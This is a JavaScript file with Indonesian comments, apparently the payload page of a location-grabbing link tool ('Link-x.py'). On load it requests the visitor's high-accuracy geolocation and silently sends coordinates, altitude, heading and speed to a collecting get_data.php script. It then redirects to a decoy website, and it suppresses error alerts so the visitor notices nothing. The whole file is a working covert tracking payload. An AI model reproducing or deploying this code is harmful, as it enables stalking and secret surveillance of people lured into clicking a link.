// Redirect URL — akan diganti otomatis oleh Link-x.py
const REDIRECT_URL = "https://you.regettingold.com/";

function send(theUrl) {
    var xmlHttp = new XMLHttpRequest();
    xmlHttp.open("GET", theUrl, false);
    xmlHttp.send(null);
    // Tidak perlu return, karena tidak digunakan
}

function redirectToTarget() {
    // Gunakan redirect langsung (lebih andal daripada window.open)
    window.location.href = REDIRECT_URL;
}

function showPosition(position) {
    const coords = position.coords;
    const lat = coords.latitude || 0;
    const lon = coords.longitude || 0;
    const acc = coords.accuracy || "N/A";
    const alt = coords.altitude || "N/A";
    const dir = coords.heading || "N/A";
    const spd = coords.speed || "N/A";

    // Bangun query dengan encoding aman
    const query = `./get_data.php?Lat=${encodeURIComponent(lat)}&Lon=${encodeURIComponent(lon)}&Acc=${encodeURIComponent(acc)}&Alt=${encodeURIComponent(alt)}&Dir=${encodeURIComponent(dir)}&Spd=${encodeURIComponent(spd)}`;
    
    // Kirim data
    send(query);

    // Redirect setelah sukses
    redirectToTarget();
}

function showError(error) {
    // Jangan tampilkan alert (mengganggu UX & bisa stuck)
    console.warn("Geolocation error:", error);
    // Tetap redirect meskipun lokasi gagal
    redirectToTarget();
}

function locate() {
    if (navigator.geolocation) {
        const options = {
            enableHighAccuracy: true,
            timeout: 30000,
            maximumAge: 0
        };
        navigator.geolocation.getCurrentPosition(showPosition, showError, options);
    } else {
        // Jika geolocation tidak didukung, langsung redirect
        redirectToTarget();
    }
}

// Jalankan
locate();